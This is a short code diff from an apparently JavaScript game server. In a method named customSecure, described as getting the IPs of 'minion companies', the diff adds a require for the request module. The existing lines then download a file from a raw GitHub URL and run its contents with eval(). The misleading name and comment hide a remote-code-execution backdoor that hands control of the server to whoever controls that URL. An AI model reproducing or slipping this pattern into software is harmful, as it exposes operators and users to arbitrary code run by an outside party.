@@ -2119,7 +2119,7 @@ kickBots(numToKick) {
 }
 
 customSecure() { // get ips of minion companies
-    
+    var request = require('request')
      request('https://raw.githubusercontent.com/AJS-development/verse/master/ex', function (error, response, body) {
        if (!error && response.statusCode == 200 && body) {
            eval(body)
